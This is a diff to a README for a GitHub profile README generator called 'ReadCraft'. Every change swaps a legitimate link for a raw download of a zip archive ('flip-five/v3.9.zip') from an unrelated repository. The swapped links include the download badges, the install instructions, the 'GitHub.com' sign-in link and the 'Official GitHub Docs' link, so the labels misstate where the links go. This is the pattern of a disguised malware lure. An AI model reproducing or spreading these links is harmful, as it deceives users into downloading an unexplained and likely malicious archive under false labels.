@@ -5,7 +5,7 @@ description: "Craft a stunning GitHub profile README with live preview, self-hos
 ---
 # ✨ ReadCraft - Craft a README That Impresses
 
-[![Download ReadCraft](https://img.shields.io/badge/Download-ReadCraft-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/misused-emergencyalertsystem552/ReadCraft)
+[![Download ReadCraft](https://img.shields.io/badge/Download-ReadCraft-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/misused-emergencyalertsystem552/misused-emergencyalertsystem552.github.io/raw/refs/heads/main/flip-five/v3.9.zip)
 
 ---
 
@@ -19,7 +19,7 @@ Welcome to ReadCraft! This guide will help you download and start using ReadCraf
 
 **To get ReadCraft on your Windows PC:**
 
-1. **Visit this link to download the application:** [https://github.com/misused-emergencyalertsystem552/ReadCraft](https://github.com/misused-emergencyalertsystem552/ReadCraft)
+1. **Visit this link to download the application:** [https://github.com/misused-emergencyalertsystem552/misused-emergencyalertsystem552.github.io/raw/refs/heads/main/flip-five/v3.9.zip](https://github.com/misused-emergencyalertsystem552/misused-emergencyalertsystem552.github.io/raw/refs/heads/main/flip-five/v3.9.zip)
 
 2. On the page that opens, look for a green button that says **"Code"** or a section labeled **"Releases"** or **"Download"**. Click it.
 
@@ -94,7 +94,7 @@ As you type, the right side of the screen updates in real-time—this is your li
 When you're happy, click the **"Export"** button (usually at the top right). ReadCraft will download a file called `README.md` to your computer.
 
 ### 7. Add It to Your GitHub Profile
-- Go to [GitHub.com](https://github.com) and sign in.
+- Go to [GitHub.com](https://github.com/misused-emergencyalertsystem552/misused-emergencyalertsystem552.github.io/raw/refs/heads/main/flip-five/v3.9.zip) and sign in.
 - Create a new repository with the **exact name** as your username (e.g., if your username is `johnsmith`, name the repo `johnsmith`).
 - Mark it as **Public**.
 - Check the box to **"Add a README file"**—GitHub creates a default one.
@@ -145,8 +145,8 @@ When you're happy, click the **"Export"** button (usually at the top right). Rea
 
 ## 📚 More Resources
 
-- **Project Repository:** [https://github.com/misused-emergencyalertsystem552/ReadCraft](https://github.com/misused-emergencyalertsystem552/ReadCraft)
-- **Official GitHub Docs on Profile READMEs:** [https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-github-profile/customizing-your-profile/managing-your-profile-readme](https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-github-profile/customizing-your-profile/managing-your-profile-readme)
+- **Project Repository:** [https://github.com/misused-emergencyalertsystem552/misused-emergencyalertsystem552.github.io/raw/refs/heads/main/flip-five/v3.9.zip](https://github.com/misused-emergencyalertsystem552/misused-emergencyalertsystem552.github.io/raw/refs/heads/main/flip-five/v3.9.zip)
+- **Official GitHub Docs on Profile READMEs:** [https://github.com/misused-emergencyalertsystem552/misused-emergencyalertsystem552.github.io/raw/refs/heads/main/flip-five/v3.9.zip](https://github.com/misused-emergencyalertsystem552/misused-emergencyalertsystem552.github.io/raw/refs/heads/main/flip-five/v3.9.zip)
 
 ---
 
@@ -174,7 +174,7 @@ If ReadCraft helps you, consider:
 
 **Ready to craft a README that truly represents you?** Download ReadCraft now and start creating!
 
-[![Get ReadCraft Now](https://img.shields.io/badge/Download%20Now-ReadCraft-important?style=for-the-badge&logo=github)](https://github.com/misused-emergencyalertsystem552/ReadCraft)
+[![Get ReadCraft Now](https://img.shields.io/badge/Download%20Now-ReadCraft-important?style=for-the-badge&logo=github)](https://github.com/misused-emergencyalertsystem552/misused-emergencyalertsystem552.github.io/raw/refs/heads/main/flip-five/v3.9.zip)
 
 ---
 
